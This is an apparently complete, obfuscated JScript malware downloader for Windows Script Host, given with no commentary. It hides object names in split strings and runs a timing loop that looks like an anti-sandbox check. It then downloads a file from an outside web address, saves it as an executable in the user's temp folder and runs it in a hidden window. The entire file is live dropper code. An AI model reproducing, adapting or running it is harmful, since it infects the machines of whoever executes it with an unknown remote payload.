var J = false;
var OF = "Create"+"Object";
var Z1 = function L() {return WScript[OF]("WScript"+".Shell");}(), C0 = 11;
var OW = "MSXML2"+".XMLHTTP";
var SW = 2;
var Z = SW - 2;
function T(TS){Z1["Run"](TS, Z, Z);};
function UD(){return OW + "";};
function I(KO, GE){Z = Z * 1; return KO - GE;};
function S(){return OF;};
/*@cc_on
  @if (@_win32 || @_win64)
    J = true;
  @end
@*/
if (J)
{
var QX = "";
function VO(){return 22;};
var L0 = 0; var B = 0;
function JV()
{
var PG = new this["Date"]();
var R = PG["getUTCMilliseconds"]();
WScript["Sleep"](VO());
var PG = new this["Date"]();
var LB = PG["getUTCMilliseconds"]();
WScript["Sleep"](VO());
var PG = new this["Date"]();
var X = PG["getUTCMilliseconds"]();
var L0 = "M";
L0 = I(LB, R);
var B = "U";
B = I(X, LB);
QX = "open";
return I(L0, B);
}
var YC = false;
var JC = false;
for (var ZH = Z; ZH < VO() * 1; ZH++){if (JV() != Z){
YC = true; 
B = "31" + 11 * L0 + B; 
JC = true; 
break;
}}
function K() {return ((YC == true) && (YC == JC)) ? 1 : Z;};
if (YC && K() && JC){
function C() {return Z1["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Bf6rjHioarCZ.ex" + "e";};
 YK = UD();
 GW = WScript[OF](YK);
 var CA = 1;
do { 
	for (;CA;){
	try {
		if (CA == 1)
		{
			GW[QX]("GET", "http://abnreview.com.au/j7dsa", false);
			GW["send"]();
			Z0 = "Sleep";
			CA = 2;
		}
		WScript[Z0](VO() + 120); 
		if (GW["readystate"] < 2 * 2) continue;
		CA = Z;
		function K0(SR) {var JD = (1, 2, 3, 4, 5, SR); return JD;};
		FJ = WScript[S()]("ADODB.Stream");
		YK = FJ;
		YK[QX]();
		YK["type"] = K0(1);
		YK["write"](GW["ResponseBody"]);
		FJ["position"] = K0(Z);
		YK["Save" + "ToFile"](C(), 2);
		FJ["cl"+"ose"]();
		Q = C();
		T(Q);
	} catch(E){};};
}while (CA);
}
}

